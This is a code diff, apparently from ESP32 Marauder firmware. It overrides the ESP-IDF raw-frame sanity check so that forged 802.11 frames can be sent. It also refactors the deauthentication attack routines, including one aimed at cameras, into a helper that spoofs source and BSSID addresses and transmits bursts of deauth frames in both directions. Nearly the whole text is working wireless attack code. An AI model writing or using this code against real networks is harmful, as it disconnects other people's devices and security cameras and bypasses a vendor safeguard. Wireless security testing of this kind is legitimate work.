@@ -152,24 +152,16 @@ size_t WiFiScan::retainedBleDeviceCount() const {
   return ble_devices == nullptr ? 0 : ble_devices->size();
 }
 
-#ifdef HAS_IDF_3
-  extern "C" int ieee80211_raw_frame_sanity_check(
-      int32_t arg, int32_t arg2, int32_t arg3);
-
-  extern "C" int __wrap_ieee80211_raw_frame_sanity_check(
-      int32_t arg, int32_t arg2, int32_t arg3) {
-    (void)arg2;
-    (void)arg3;
-    return arg == 31337 ? 1 : 0;
-  }
-#else
-  extern "C" int ieee80211_raw_frame_sanity_check(
-      int32_t arg, int32_t arg2, int32_t arg3) {
-    (void)arg2;
-    (void)arg3;
-    return arg == 31337 ? 1 : 0;
-  }
-#endif
+// esp_wifi_80211_tx() and the IDF sanity check live in the same precompiled
+// object on ESP32-C5, so --wrap cannot intercept the internal call. The 3.3.4
+// build links this narrow override first with -zmuldefs, matching Marauder's
+// established raw-management-frame build path.
+extern "C" int ieee80211_raw_frame_sanity_check(
+    int32_t arg, int32_t arg2, int32_t arg3) {
+  (void)arg2;
+  (void)arg3;
+  return arg == 31337 ? 1 : 0;
+}
 
 extern "C" {
   uint8_t esp_base_mac_addr[6];
@@ -3020,6 +3012,8 @@ void WiFiScan::startWiFiAttacks(uint8_t scan_mode, uint16_t color, const char* t
   }
         
   packets_sent = 0;
+  deauth_sequence = 0;
+  deauth_tx_failed = 0;
   esp_wifi_init(&cfg);
   #ifdef HAS_IDF_3
     esp_wifi_set_country(&country);
@@ -9638,64 +9632,36 @@ void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
   WiFiScan::set_channel = channel;
   this->changeChannel(channel);
   delay(1);
-  
-  // Build AP source packet
-  deauth_frame_default[4] = mac[0];
-  deauth_frame_default[5] = mac[1];
-  deauth_frame_default[6] = mac[2];
-  deauth_frame_default[7] = mac[3];
-  deauth_frame_default[8] = mac[4];
-  deauth_frame_default[9] = mac[5];
-  
-  deauth_frame_default[10] = bssid[0];
-  deauth_frame_default[11] = bssid[1];
-  deauth_frame_default[12] = bssid[2];
-  deauth_frame_default[13] = bssid[3];
-  deauth_frame_default[14] = bssid[4];
-  deauth_frame_default[15] = bssid[5];
 
-  deauth_frame_default[16] = bssid[0];
-  deauth_frame_default[17] = bssid[1];
-  deauth_frame_default[18] = bssid[2];
-  deauth_frame_default[19] = bssid[3];
-  deauth_frame_default[20] = bssid[4];
-  deauth_frame_default[21] = bssid[5];      
+  for (uint8_t copy = 0; copy < 3; copy++)
+    this->transmitDeauthFrame(mac, bssid, bssid);
 
-  // Send packet
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+  // A broadcast/multicast destination cannot be used as a valid transmitter.
+  if ((mac[0] & 0x01) == 0) {
+    for (uint8_t copy = 0; copy < 3; copy++)
+      this->transmitDeauthFrame(bssid, mac, bssid);
+  }
+}
 
-  packets_sent = packets_sent + 3;
+esp_err_t WiFiScan::transmitDeauthFrame(const uint8_t destination[6],
+                                        const uint8_t source[6],
+                                        const uint8_t bssid[6]) {
+  memcpy(deauth_frame_default + 4, destination, 6);
+  memcpy(deauth_frame_default + 10, source, 6);
+  memcpy(deauth_frame_default + 16, bssid, 6);
 
-  // Build AP dest packet
-  deauth_frame_default[4] = bssid[0];
-  deauth_frame_default[5] = bssid[1];
-  deauth_frame_default[6] = bssid[2];
-  deauth_frame_default[7] = bssid[3];
-  deauth_frame_default[8] = bssid[4];
-  deauth_frame_default[9] = bssid[5];
-  
-  deauth_frame_default[10] = mac[0];
-  deauth_frame_default[11] = mac[1];
-  deauth_frame_default[12] = mac[2];
-  deauth_frame_default[13] = mac[3];
-  deauth_frame_default[14] = mac[4];
-  deauth_frame_default[15] = mac[5];
+  const uint16_t sequenceControl =
+      static_cast<uint16_t>((deauth_sequence++ & 0x0FFF) << 4);
+  deauth_frame_default[22] = sequenceControl & 0xFF;
+  deauth_frame_default[23] = sequenceControl >> 8;
 
-  deauth_frame_default[16] = mac[0];
-  deauth_frame_default[17] = mac[1];
-  deauth_frame_default[18] = mac[2];
-  deauth_frame_default[19] = mac[3];
-  deauth_frame_default[20] = mac[4];
-  deauth_frame_default[21] = mac[5];      
-
-  // Send packet
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-
-  packets_sent = packets_sent + 3;
+  const esp_err_t result = esp_wifi_80211_tx(
+      WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+  if (result == ESP_OK)
+    packets_sent++;
+  else
+    deauth_tx_failed++;
+  return result;
 }
 
 #ifdef MARAUDER_MINI_V3
@@ -9704,14 +9670,10 @@ void WiFiScan::sendCameraDeauthFrame(
   this->set_channel = link.channel;
   this->changeChannel(link.channel);
 
-  memcpy(deauth_frame_default + 4, link.destination, 6);
-  memcpy(deauth_frame_default + 10, link.bssid, 6);
-  memcpy(deauth_frame_default + 16, link.bssid, 6);
   for (uint8_t copy = 0; copy < 3; copy++) {
-    if (esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default,
-                          sizeof(deauth_frame_default), false) == ESP_OK) {
+    if (this->transmitDeauthFrame(link.destination, link.bssid,
+                                  link.bssid) == ESP_OK) {
       link.txSuccess++;
-      packets_sent++;
     }
     else {
       link.txFailed++;
@@ -9719,14 +9681,10 @@ void WiFiScan::sendCameraDeauthFrame(
   }
 
   if ((link.destination[0] & 0x01) == 0) {
-    memcpy(deauth_frame_default + 4, link.bssid, 6);
-    memcpy(deauth_frame_default + 10, link.destination, 6);
-    memcpy(deauth_frame_default + 16, link.bssid, 6);
     for (uint8_t copy = 0; copy < 3; copy++) {
-      if (esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default,
-                            sizeof(deauth_frame_default), false) == ESP_OK) {
+      if (this->transmitDeauthFrame(link.bssid, link.destination,
+                                    link.bssid) == ESP_OK) {
         link.txSuccess++;
-        packets_sent++;
       }
       else {
         link.txFailed++;
